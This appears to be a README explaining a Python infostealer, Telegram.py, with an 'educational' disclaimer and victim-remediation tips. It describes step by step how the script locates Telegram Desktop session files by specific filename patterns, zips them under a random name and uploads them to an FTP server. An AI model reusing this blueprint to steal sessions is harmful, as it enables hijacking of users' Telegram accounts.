# Telegram.py

This code demonstrates how data stealing can be achieved by targeting a user's Telegram Desktop application. It locates and extracts sensitive files, compresses them, and uploads them to a remote server. It is highly notable that this code is provided for educational purposes only to illustrate how such attacks work.  Understanding these techniques is crucial for developing strong security practices and protecting yourself from malicious actors.

# It is imperative that this code is not used for any illegal or unethical activities. 

In essence, this code is designed to:

Locate sensitive data within a user's Telegram Desktop application folder.
Compress this data into a zip file.
Generate a random filename for the zip file.
Upload the zip file to a remote FTP server.
This is highly suspicious and likely malicious. If you found this code on your computer, it's crucial to take immediate steps to secure your system and data.  You should:

Run a full system scan with a reputable antivirus program.
Change your Telegram password and enable two-factor authentication.
Change passwords for any other important accounts, especially if you reuse passwords.
Monitor your online accounts for any suspicious activity.
It's important to be cautious about where you download and run code from. Avoid executing scripts from untrusted sources.

## This Python code is designed to steal sensitive data from a user's Telegram Desktop application and upload it to an FTP server. Let's break down the code step-by-step:

1. Importing Libraries:

```
re:  Used for regular expression matching to find specific files.
zipfile: Used to create a zip archive.
ftplib: Used to interact with an FTP server.
os: Used for interacting with the operating system, like getting file paths and listing directories.
random: Used to generate a random filename for the zip archive.
```

2. Defining Paths and FTP Credentials:

```
pathusr: Gets the user's home directory.
teleg: Constructs the path to the Telegram Desktop data directory.
zipp: Constructs the path for a temporary zip file.
server, user, pasd: Placeholders for the FTP server address, username, and password. (These would need to be filled in with actual values).
```

3. Establishing FTP Connection:

```
ftp = FTP_TLS(): Creates an FTP_TLS object for secure connection.
ftp.set_debuglevel(2): Sets the debug level for the FTP connection (likely for troubleshooting).
ftp.connect(server, 21): Connects to the FTP server at the specified address and port (21 is the standard FTP port).
ftp.sendcmd(...): Sends the username and password to the FTP server for authentication.
```

4. Locating and Zipping Telegram Files:

```
os.listdir(teleg): Lists the files and directories in the Telegram data directory.
findall(...): Uses regular expressions to find specific files (D877F783D5D3EF8C\S and map\S) within the Telegram directory. These files likely contain sensitive user data like chat history, contacts, or session information.
zippy = ZipFile(zipp, 'w'): Creates a new zip archive.
zippy.write(file): Adds the found Telegram files to the zip archive.
```

5. Generating a Random Filename:

```
This section creates a random string of 10 characters using letters, numbers, and uppercase letters. This random string is used to create a unique filename for the zip archive.
```

6. Uploading the Zip File:

```
ftp.storbinary(...): Uploads the zip archive to the FTP server using the randomly generated filename.
```

7. Closing the Connection:

```
ftp.close(): Closes the FTP connection.
```

